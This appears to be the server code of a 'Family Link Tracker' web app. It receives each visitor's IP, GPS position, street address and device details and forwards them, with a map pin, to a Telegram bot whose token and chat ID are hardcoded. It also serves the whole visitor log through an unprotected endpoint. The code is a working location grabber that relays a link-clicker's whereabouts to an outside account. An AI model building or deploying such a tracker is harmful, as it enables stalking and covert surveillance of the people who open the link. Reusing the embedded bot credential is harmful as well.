const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Start HTTP server (Render provides HTTPS automatically)
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Family Link Tracker is running on port ${PORT}!`);
    if (!process.env.PORT) {
        // Local development — also start HTTPS for phone testing
        const https = require('https');
        const selfsigned = require('selfsigned');
        const attrs = [{ name: 'commonName', value: 'Family Tracker' }];
        const pems = selfsigned.generate(attrs, { days: 365, keySize: 2048 });
        const HTTPS_PORT = 3443;
        https.createServer({ key: pems.private, cert: pems.cert }, app)
            .listen(HTTPS_PORT, '0.0.0.0', () => {
                console.log(`🔒 HTTPS: https://localhost:${HTTPS_PORT}`);
                console.log(`📱 Phone: https://192.168.137.1:${HTTPS_PORT}`);
            });
    }
    console.log(`📊 Dashboard: /dashboard.html`);
    console.log('');
});


// ============================================
// ⚙️ CONFIGURATION - Update these values
// ============================================
const TELEGRAM_BOT_TOKEN = '8769669312:AAFNb_vouYN_jDT7v0CQuJYx-D6vvYbOZr4';
const TELEGRAM_CHAT_ID = '6812241388';
// ============================================

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Store visitors log
const visitorsLog = [];

// Get real IP from request
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.headers['x-real-ip'] ||
        req.connection?.remoteAddress ||
        req.socket?.remoteAddress ||
        'Unknown';
}

// Send message to Telegram
async function sendToTelegram(message) {
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        console.log('⚠️  Chat ID not configured! Set TELEGRAM_CHAT_ID in server.js');
        console.log('Message would have been:', message);
        return;
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (!data.ok) {
            console.error('Telegram API error:', data.description);
        } else {
            console.log('✅ Message sent to Telegram successfully');
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error.message);
    }
}

// Send location to Telegram
async function sendLocationToTelegram(lat, lon) {
    if (TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') return;

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                latitude: lat,
                longitude: lon
            })
        });
    } catch (error) {
        console.error('Error sending location:', error.message);
    }
}

// API endpoint to collect visitor data
app.post('/api/collect', async (req, res) => {
    const serverIP = getClientIP(req);
    const data = req.body;

    // Use the REAL public IP from ip-api.com (client-side), fallback to server-detected IP
    const realIP = data.ipInfo?.ip || serverIP;

    const visitorInfo = {
        timestamp: new Date().toISOString(),
        ip: realIP,
        ...data
    };

    // Also update the ipInfo.ip to ensure consistency
    if (visitorInfo.ipInfo) {
        visitorInfo.ipInfo.ip = realIP;
    }

    visitorsLog.push(visitorInfo);

    // Format message for Telegram
    const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Amman' });

    let message = `🔔 <b>📍 تتبع جهاز - زائر جديد!</b>\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `🕐 <b>الوقت:</b> ${now}\n`;
    message += `🌐 <b>IP:</b> <code>${realIP}</code>\n`;

    // GPS Precise Location (priority - like Device Manager)
    if (data.gpsLocation && data.gpsLocation.lat) {
        message += `\n🎯 <b>الموقع الدقيق (GPS):</b>\n`;
        message += `   📍 المدينة: ${data.gpsLocation.city || 'غير معروف'}\n`;
        if (data.gpsLocation.district) message += `   🏘️ الحي: ${data.gpsLocation.district}\n`;
        if (data.gpsLocation.road) message += `   �️ الشارع: ${data.gpsLocation.road}\n`;
        if (data.gpsLocation.state) message += `   �🗺️ المحافظة: ${data.gpsLocation.state}\n`;
        message += `   🌍 الدولة: ${data.gpsLocation.country || 'غير معروف'}\n`;
        message += `   � الدقة: ${data.gpsLocation.accuracy || '?'}\n`;
        message += `   📐 الإحداثيات: <code>${data.gpsLocation.lat}, ${data.gpsLocation.lon}</code>\n`;
        if (data.gpsLocation.fullAddress) {
            message += `   🏠 العنوان الكامل: ${data.gpsLocation.fullAddress}\n`;
        }
        message += `   🗺️ خريطة: https://www.google.com/maps?q=${data.gpsLocation.lat},${data.gpsLocation.lon}\n`;
    } else {
        // Fallback to IP-based location
        if (data.ipInfo) {
            message += `\n📍 <b>الموقع التقريبي (IP):</b>\n`;
            message += `   🏙️ المدينة: ${data.ipInfo.city || 'غير معروف'}\n`;
            message += `   🗺️ المنطقة: ${data.ipInfo.region || 'غير معروف'}\n`;
            message += `   🌍 الدولة: ${data.ipInfo.country || 'غير معروف'}\n`;
        }
    }

    if (data.ipInfo) {
        message += `\n🌐 <b>معلومات الشبكة:</b>\n`;
        message += `   🏢 مزود الخدمة: ${data.ipInfo.isp || 'غير معروف'}\n`;
        message += `   ⏰ المنطقة الزمنية: ${data.ipInfo.timezone || 'غير معروف'}\n`;
    }

    if (data.device) {
        message += `\n📱 <b>معلومات الجهاز:</b>\n`;
        message += `   💻 النظام: ${data.device.platform || 'غير معروف'}\n`;
        message += `   🌐 المتصفح: ${data.device.browser || 'غير معروف'}\n`;
        message += `   📐 الشاشة: ${data.device.screenWidth}x${data.device.screenHeight}\n`;
        message += `   🗣️ اللغة: ${data.device.language || 'غير معروف'}\n`;
        message += `   📶 الاتصال: ${data.device.connection || 'غير معروف'}\n`;
        message += `   🔋 البطارية: ${data.device.battery || 'غير معروف'}\n`;
        message += `   📱 الجهاز: ${data.device.isMobile ? 'موبايل' : 'كمبيوتر'}\n`;
    }

    message += `━━━━━━━━━━━━━━━━━━`;

    // Send text message
    await sendToTelegram(message);

    // Send location pin — prefer GPS (accurate) over IP-based
    const pinLat = data.gpsLocation?.lat || data.ipInfo?.lat;
    const pinLon = data.gpsLocation?.lon || data.ipInfo?.lon;
    if (pinLat && pinLon) {
        await sendLocationToTelegram(pinLat, pinLon);
    }

    const locationCity = data.gpsLocation?.city || data.ipInfo?.city || 'Unknown';
    console.log(`📋 Visitor logged: ${realIP} from ${locationCity}`);

    res.json({ status: 'ok' });
});

// Dashboard endpoint to view all visitors
app.get('/api/visitors', (req, res) => {
    res.json(visitorsLog);
});

// Serve main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
